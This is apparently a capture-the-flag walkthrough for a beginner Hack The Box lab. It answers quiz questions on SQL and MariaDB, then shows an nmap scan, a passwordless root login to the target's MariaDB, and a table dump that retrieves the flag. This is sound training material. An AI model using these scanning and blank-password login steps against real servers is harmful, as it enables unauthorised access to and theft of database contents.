### [ What does the acronym SQL stand for? ]

Structured Query Language

---

### [ During our scan, which port running mysql do we find? ]

Let's run a basic nmap scan on the target machine.

```
sudo nmap -sC -sV -vv -T4 10.129.79.12
```

From the results, we know that mysql is running on port **3306**.

---

### [ What community-developed MySQL version is the target running? ]

Nmap also reveals that the MySQL version running is **MariaDB**.

---

### [ What switch do we need to use in order to specify a login username for the MySQL service? ]

`-u`

---

### [ Which username allows us to log into MariaDB without providing a password? ]

Let's try login into the MariaDB server with the username: 

> root

Hopefully we are able to log into the server without requiring a password:

```
mysql -h 10.129.79.12 -u root
```

Nice, we're in! The username is: **root**

---

### [ What symbol can we use to specify within the query that we want to display everything inside a table? ]

`*`

---

### [ What symbol do we need to end each query with? ]

`;`

---

### [ Submit root flag ]

Let's first see what databases are in the server:

```
show databases;
```

The **htb** database seems interesting. Let's see what tables are in it:

```
use htb;
show tables;
```

Finally, let's dump out all the data in the **config** table:

```
select * from config;
```

And the **root flag** is in the table!
